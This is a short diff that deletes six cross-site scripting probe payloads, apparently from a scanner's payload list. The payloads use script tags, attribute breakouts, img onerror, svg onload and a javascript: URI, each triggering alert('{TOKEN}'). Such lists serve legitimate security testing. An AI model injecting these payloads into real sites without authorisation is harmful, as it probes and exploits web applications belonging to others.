@@ -1,6 +1,0 @@
-<script>alert('{TOKEN}')</script>
-"><script>alert('{TOKEN}')</script>
-<img src=x onerror=alert('{TOKEN}')>
-<svg onload=alert('{TOKEN}')>
-'><svg/onload=alert('{TOKEN}')>
-javascript:alert('{TOKEN}')
